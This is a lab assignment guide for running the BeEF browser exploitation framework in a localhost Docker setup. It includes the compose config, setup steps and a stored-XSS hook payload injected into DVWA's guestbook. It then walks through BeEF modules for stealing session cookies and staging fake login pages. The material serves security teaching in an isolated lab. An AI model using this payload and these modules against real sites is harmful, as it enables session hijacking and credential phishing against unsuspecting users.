# Browser Exploitation Framework (BeEF) Setup & Local Configuration Guide
Assignment 05 — Cross-Site Scripting (XSS) Exploitation

> **Target Scope:** Strictly localhost (`127.0.0.1:3000`) within the containerized lab network.  
> **Status:** `[HUMAN-EXECUTED — PENDING]` (Follow these steps when conducting browser hook tests).

---

## 1. Containerized Architecture & Ports

The Browser Exploitation Framework (BeEF) is integrated into `docker-compose.yml` using the pinned image `bcarvajal/beef-xss:latest`:

```yaml
  beef:
    image: bcarvajal/beef-xss:latest
    container_name: wsl_beef
    restart: unless-stopped
    environment:
      BEEF_PASSWORD: ${BEEF_PASSWORD:-change_me_beef}
    ports:
      - "127.0.0.1:3000:3000"
    networks:
      - lab_net
```

- **Loopback Enforcement:** Binds exclusively to `127.0.0.1:3000`. Never expose port 3000 to public interfaces.
- **Admin Panel URL:** `http://localhost:3000/ui/panel`
- **Default Credentials:**
  - Username: `beef`
  - Password: Set in `.env` (default template: `change_me_beef`)

---

## 2. Step-by-Step Operator Setup Instructions

1. **Launch Services**:
   ```bash
   make up
   # Or: docker-compose up -d beef
   ```
2. **Verify Daemon Startup**:
   ```bash
   docker logs wsl_beef
   ```
   *Expected Log Output:* `[*] BeEF server running on: http://0.0.0.0:3000`
3. **Access Management Console**:
   - Open a browser on your local workstation and navigate to:  
     `http://localhost:3000/ui/panel`
   - Authenticate using username `beef` and your configured password.
4. **Locate Hook Script**:
   - The JavaScript hook is hosted at:  
     `http://127.0.0.1:3000/hook.js`

---

## 3. Hooking a Test Victim Browser

1. In a secondary browser tab or separate test profile, navigate to the local vulnerable XSS page or DVWA Stored XSS:
   `http://localhost:8080/vulnerabilities/xss_s/`
2. Inject the hook payload into the guestbook message field:
   ```html
   <script src="http://127.0.0.1:3000/hook.js"></script>
   ```
3. Submit the guestbook entry.
4. Return to the BeEF Management Console:
   - Expand the **Online Browsers** panel in the left tree view.
   - Observe the newly hooked browser IP (`127.0.0.1`), browser type, version, and OS.
5. In the **Commands** module tab:
   - Select **Browser** → **Hooked Domain** → **Get Cookie**.
   - Click **Execute** to retrieve the session tokens.
   - Select **Social Engineering** → **Google Phishing** or **Pretty Theft** to demonstrate UI hijacking.

---

## 4. Evidence Capture Requirement
Save your screenshot showing the hooked browser session in the BeEF control panel to:  
`results/screenshots/a5-beef-hook.png`
